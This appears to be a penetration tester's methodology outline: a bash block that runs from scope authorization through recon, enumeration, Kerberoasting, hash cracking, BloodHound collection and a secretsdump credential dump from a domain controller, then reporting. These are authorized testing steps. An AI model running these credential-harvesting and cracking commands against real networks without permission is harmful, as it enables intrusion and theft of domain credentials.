## `~/methodology`

A condensed view of the engagement loop I follow when assessing a scoped target.
Each phase produces artefacts (notes, captures, payloads, IoCs) that feed the
next one.

```bash
# 0. Scope confirmation
$ verify_authorization --signed --in-writing
$ define_rules_of_engagement
$ snapshot_lab_state

# 1. Recon (passive → active)
$ amass enum -passive -d $TARGET
$ subfinder -d $TARGET -silent | httpx -tech-detect
$ nmap -sS -p- --min-rate 5000 $RANGE
$ masscan -p1-65535 $RANGE --rate 10000

# 2. Enumeration
$ NetExec smb $RANGE --shares
$ NetExec ldap $DC -u $USER -p $PASS --kerberoasting krbout.txt
$ ffuf -w wordlist.txt -u https://$TARGET/FUZZ -mc 200,301,403

# 3. Foothold
$ python3 GetUserSPNs.py -request domain.local/$USER:$PASS
$ hashcat -m 13100 krbout.txt rockyou.txt

# 4. Lateral / privilege escalation
$ bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All
$ python3 secretsdump.py -just-dc $DOMAIN/$ADMIN@$DC

# 5. Reporting
$ document_findings --cvss --remediation --re-test
$ rotate_loot --shred
$ revoke_test_credentials
```
